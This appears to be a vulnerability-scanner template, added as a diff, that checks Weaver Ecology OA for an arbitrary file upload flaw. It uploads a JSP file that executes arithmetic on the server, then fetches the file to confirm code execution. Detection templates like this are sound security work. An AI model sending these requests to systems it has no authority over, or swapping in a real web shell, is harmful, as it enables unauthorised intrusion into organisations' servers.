@@ -1,0 +1,40 @@
+id: weaver-ecology-oa-uploadoperation-arbitrary-file-upload
+info:
+  name: Weaver Ecology OA uploadOperation.jsp Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  r_rand_name: '{{rand_base(5)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/page/exportImport/uploadOperation.jsp'
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+      Connection: close
+    body: |
+      -----------------------------boundary
+      Content-Disposition: form-data; name="file"; filename="{{r_rand_name}}.jsp"
+      Content-Type: application/octet-stream
+
+      <%out.print(123456789+12321424);%>
+      -----------------------------boundary--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/page/exportImport/fileTransfer/{{r_rand_name}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "135778213"
